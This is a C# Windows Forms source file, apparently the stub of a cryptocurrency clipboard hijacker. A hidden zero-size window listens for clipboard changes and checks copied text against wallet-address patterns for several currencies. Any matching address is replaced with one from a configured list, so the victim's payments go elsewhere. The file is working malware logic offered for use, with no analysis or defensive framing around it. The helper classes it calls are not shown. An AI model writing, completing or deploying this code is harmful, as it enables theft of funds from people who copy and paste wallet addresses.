using Stub.Startup;
using Stub.Help;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Stub
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            SuspendLayout();

            ClientSize = new Size(0, 0);
            Name = "Form1";
            Text = "Form1";
            Load += new EventHandler(Form1_Load_1);
            ResumeLayout(false);
            AddClipboardFormatListener(Handle);
        }

        private void Form1_Load_1(object sender, EventArgs e)
        {
            throw new NotImplementedException();
        }

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        protected override void WndProc(ref Message m)
        {
            try
            {
                base.WndProc(ref m);
                if (m.Msg != 0x031D) return;
                if (!Clipboard.ContainsText()) return;
                var buf = ClipboardNative.GetText().Trim();
                foreach (KeyValuePair<string, Regex> regxvalue in RegexPatterns.patterns)
                {
                    string cryptocurrency = regxvalue.Key;
                    Regex pattern = regxvalue.Value;

                    if (pattern.Match(buf).Success)
                    {
                        try
                        {
                            string[] strings = Config.addresses[cryptocurrency];
                            string[] replace_to = strings;
                            if (!Config.addresses[cryptocurrency].Contains(buf))
                            {
                                ThreadReplace(buf, replace_to);
                            }
                        }
                        catch (Exception ex) { Console.WriteLine(ex); }
                    }
                }
            }
            catch { }
            base.WndProc(ref m);
        }

        public static void ThreadReplace(string w, string[] list)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    try
                    {
                        SetClipBoard.Run(w, list);
                    }
                    catch { };
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }

        private void Form1_Load(object sender, EventArgs e)
        {


        }
    }
}
